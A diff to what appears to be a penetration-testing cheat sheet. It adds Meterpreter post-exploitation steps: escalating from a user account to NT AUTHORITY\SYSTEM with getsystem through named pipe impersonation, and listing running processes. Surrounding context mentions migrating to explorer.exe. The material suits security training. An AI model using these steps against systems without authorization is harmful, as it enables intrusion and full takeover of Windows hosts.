@@ -1847,6 +1847,26 @@ User has been idle for: 9 mins 53 secs
 ~~~
 
 
+## Elevate our privileges with getsystem
+
+~~~ bash
+meterpreter > getuid
+Server username: ITWK01\luiza
+
+meterpreter > getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+~~~
+
+## Display list of running processes
+
+~~~ bash
+meterpreter > ps
+~~~
+
+
 ## Migrate to explorer.exe
 
 ~~~ bash
